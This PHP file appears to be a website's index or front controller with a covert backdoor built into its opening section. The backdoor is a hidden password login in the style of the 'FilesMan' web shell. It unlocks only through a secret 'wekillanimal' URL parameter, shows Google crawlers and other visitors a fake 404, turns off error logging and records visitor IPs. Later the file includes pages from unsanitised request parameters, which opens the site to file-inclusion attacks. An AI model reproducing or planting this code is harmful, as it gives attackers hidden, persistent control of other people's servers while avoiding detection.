<?php
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
$auth_text = "yk123@N";
$auth_pass = "".md5($auth_text)."";
$color = "#00ff00";
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
if (strpos($_SERVER['HTTP_USER_AGENT'], 'Google') !== false) {
    header('HTTP/1.0 404 Not Found');
    exit;
}
@session_start();
@error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', '2.1');
if (get_magic_quotes_gpc()) {
    function stripslashes_array($array) {
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
    }
    $_POST = stripslashes_array($_POST);
}
function printLogin() {
if(isset($_GET['wekillanimal'])) {
?> 
<html>
<head>
<body bgcolor=white>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<style type="text/css">
A:link {text-decoration: none; color: black }
A:visited {text-decoration: none;color:black}
A:active {text-decoration: none}
A:hover {text-decoration: underline; color: black;}
input, textarea, button
{
	font-size: 11pt;
	color: 	#000000;
	font-family: verdana, sans-serif;
	background-color: #ffffff;
	border-left: 2px dashed black;
	border-top: 2px dashed black;
	border-right: 2px dashed black;
	border-bottom: 2px dashed black;
}

</style>
<BR><BR><BR>
<div align=center >
<div>
<font color=black>
<form method="POST" action="">
	<span style="font:20pt tahoma;"> </span><input name="pass" type="password" size="30">
	<input type="hidden" name="doing" value="unlock">
	<input type="submit" value="UNLOCK">
	</form>
</div>
</fieldset>
</head>
</html>
<?php
} else {
header('HTTP/1.0 404 Not Found');
echo '<title>NOTICE</title><center><a href="#"><img src="ipr.jpg"><a></center>';
}
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) if (empty($auth_pass) || (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))) $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
else printLogin();
ob_start();
if (gethostbyaddr($_SERVER['REMOTE_ADDR']) == $_SERVER['REMOTE_ADDR']){
    $file = fopen("data_ip_masuk.txt","a");
fwrite($file, $_SERVER['REMOTE_ADDR'].'
');
    fclose($file);
} else {
    $file = fopen("data_ip_masuk.txt","a");
fwrite($file, $_SERVER['REMOTE_ADDR'].' '.gethostbyaddr($_SERVER['REMOTE_ADDR']).'
');
    fclose($file);
}
include "core.php";
$path = ROOT."content/page/";
if(isset($_GET['page']) && (!empty($_GET['page']))){
	if(isset($_GET['do']) && (!empty($_GET['do']))){
		if(file_exists($path.$_GET['do'].".do.php")){
			require_once $path.$_GET['do'].".do.php";
		} else {
			require_once $path."404.php";
		}
	} else {
		if(file_exists($path.$_GET['page'].".php")){
			require_once $path.$_GET['page'].".php";
		} else {
			require_once $path."404.php";
		}
	}
} else {
	require_once $path."home.php";
}
	
ob_flush(); 
?>